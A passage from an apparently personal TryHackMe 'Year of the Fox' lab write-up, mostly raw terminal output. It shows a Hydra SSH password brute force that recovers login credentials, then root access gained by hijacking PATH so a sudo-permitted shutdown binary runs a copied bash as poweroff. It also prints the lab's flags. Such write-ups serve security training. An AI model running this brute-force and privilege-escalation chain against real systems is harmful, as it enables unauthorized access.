[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.4.252:8888/
[STATUS] 176.00 tries/min, 176 tries in 00:01h, 14344223 to do in 1358:22h, 16 active
[STATUS] 165.33 tries/min, 496 tries in 00:03h, 14343903 to do in 1445:58h, 16 active
[8888][ssh] host: 10.10.4.252   login: fox   password: nichole
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-28 09:44:24
                                                                                      

 now we can ssh to the machine:
 

 ┌──(kali㉿kali)-[~/Practice/tryhackme/YearOfTheFox]
└─$ ssh -p 8888 fox@10.10.4.252                                                                                                                                                                255 ⨯
The authenticity of host '[10.10.4.252]:8888 ([10.10.4.252]:8888)' can't be established.
ECDSA key fingerprint is SHA256:UUzRY8LX3i6B/7AWHKO+WY0vkPQsuyyNpEvf2BI6jMU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.4.252]:8888' (ECDSA) to the list of known hosts.
fox@10.10.4.252's password: 


        __   __                       __   _   _            _____         
        \ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  ___|____  __
         \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_ / _ \ \/ /
          | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  _| (_) >  < 
          |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|  \___/_/\_\


                                                                  
fox@year-of-the-fox:~$ 



fox@year-of-the-fox:~$ cat user-flag.txt 
THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}


PRIVESC:


fox@year-of-the-fox:/usr/sbin$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown


copy shutdown binary to our machine


Using redare2, we determine that shutdown uses another binary (poweroff) without absolute path. We have path injection vulnerability!!!!



fox@year-of-the-fox:/usr/sbin$ cp /bin/bash /tmp/poweroff
fox@year-of-the-fox:/usr/sbin$ ls -la /tmp
total 1128
drwxrwxrwt 10 root root    4096 Jun 28 14:51 .
drwxr-xr-x 22 root root    4096 May 29  2020 ..
drwxrwxrwt  2 root root    4096 Jun 28 13:49 .font-unix
drwxrwxrwt  2 root root    4096 Jun 28 13:49 .ICE-unix
-rwxr-xr-x  1 fox  fox  1113504 Jun 28 14:51 poweroff
drwx------  3 root root    4096 Jun 28 13:49 systemd-private-b0873e9dcba24fc6953c37dec2b955fd-apache2.service-zMQK6Q
drwx------  3 root root    4096 Jun 28 13:49 systemd-private-b0873e9dcba24fc6953c37dec2b955fd-systemd-resolved.service-ReJRLn
drwx------  3 root root    4096 Jun 28 13:49 systemd-private-b0873e9dcba24fc6953c37dec2b955fd-systemd-timesyncd.service-LHQ1WT
drwxrwxrwt  2 root root    4096 Jun 28 13:49 .Test-unix
drwxrwxrwt  2 root root    4096 Jun 28 13:49 .X11-unix
drwxrwxrwt  2 root root    4096 Jun 28 13:49 .XIM-unix


change path:


fox@year-of-the-fox:/usr/sbin$ sudo "PATH=/tmp:$PATH" /usr/sbin/shutdown
root@year-of-the-fox:/usr/sbin# cd /root
root@year-of-the-fox:/root# ls
root.txt
root@year-of-the-fox:/root# cat root.txt
Not here -- go find!


root flag not here :(

root@year-of-the-fox:/root# find / -name *root -type f 2>/dev/null
/sys/kernel/security/apparmor/features/namespaces/pivot_root
/var/spool/cron/crontabs/root
/run/initramfs/fsck-root
/usr/sbin/overlayroot-chroot
/usr/sbin/chroot
/usr/share/initramfs-tools/scripts/local-top/cryptroot
/usr/share/initramfs-tools/scripts/local-block/cryptroot
/usr/share/initramfs-tools/scripts/init-bottom/overlayroot
/usr/share/initramfs-tools/hooks/cryptroot
/usr/share/initramfs-tools/hooks/overlayroot
/usr/share/initramfs-tools/conf-hooks.d/overlayroot
/usr/share/lxc/hooks/mountecryptfsroot
/usr/share/bash-completion/completions/pivot_root
/usr/bin/ischroot
/usr/lib/klibc/bin/chroot
/usr/lib/klibc/bin/pivot_root
/usr/lib/initramfs-tools/bin/wait-for-root
/sbin/pivot_root
/sbin/switch_root
/bin/btrfs-find-root
/lib/recovery-mode/options/root
/lib/systemd/systemd-volatile-root
/home/rascal/.did-you-think-I-was-useless.root



root flag:


root@year-of-the-fox:/root# cat /home/rascal/.did-you-think-I-was-useless.root
T
H
M
{ODM3NTdk
MDljYmM4Z
jdhZWFhY2
VjY2Fk}

Here's the prize:

YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMw
Mwo=

Good luck!
                                                                                     